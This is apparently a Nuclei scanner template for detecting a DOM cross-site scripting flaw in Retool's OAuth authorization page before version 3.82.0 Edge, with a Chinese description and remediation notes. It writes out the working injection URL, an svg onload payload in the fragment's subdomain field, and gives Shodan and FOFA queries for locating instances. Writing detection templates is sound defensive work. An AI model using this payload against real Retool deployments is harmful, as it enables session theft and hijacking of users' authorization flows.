id: retool-dom-xss

info:
  name: Retool < 3.82.0 Edge OAuth 授权 DOM 跨站脚本漏洞（headless）
  author: rootxharsh,iamnoooob,pdresearch
  severity: high
  description: |
    Retool 3.82.0-Edge 以下版本的 OAuth 授权页面在解析片段数据时可能将 `subdomain` 等字段不安全地写入 DOM，形成 DOM XSS。本模板访问 `/oauth/authorize` 并在 fragment 中注入带随机值的 `<svg/onload=prompt(...)>`，等待对话框并精确匹配随机消息；命中表示 OAuth 授权页面已将受控片段数据送入可执行 DOM 上下文。
  impact: |
    - 攻击者可构造恶意 OAuth 授权链接，诱导 Retool 用户访问后在其浏览器中执行脚本。
    - 在用户已登录或授权上下文中，脚本可能读取页面数据、窃取会话信息、篡改授权流程或冒用用户操作。
    - 实际影响取决于受害者登录状态、授权页面可访问的数据以及浏览器端会话隔离情况。
  remediation: |
    - 将 Retool Edge 升级至 3.82.0 或更高的包含修复版本，并按厂商发布说明完成相关组件更新。
    - 在修复前限制 OAuth 授权入口的外部可达性，拒绝未经校验的 fragment 字段，并避免将其直接拼接到 HTML。
    - 修复后使用带随机标记的授权 fragment 复测，确认不会再弹出由输入触发的对话框。
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Retool"
    fofa-query: body="Retool"
  tags: headless,retool,dom,xss,vuln

variables:
  random_int: '{{rand_int(1,1000)}}'

headless:
  - steps:
      - args:
          url: '{{BaseURL}}/oauth/authorize#%7B%20"redirectUri":%20"zzz",%20"resourceId":%20"fff",%20"resourceName":%20"aa",%20"resourceType":%20"azz",%20"userEmail":%20"aaa@aa.com",%20"userFirstName":%20"zzz",%20"userLastName":%20"zzff",%20"xsrfToken":%20"x","subdomain":"aaa<svg/onload=prompt({{random_int}})>aaaa","accessToken":"ab"%20%7D'
        action: navigate

      - action: waitdialog
        name: subdomain_object_dom

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - subdomain_object_dom == true
          - subdomain_object_dom_message == random_int
        condition: and
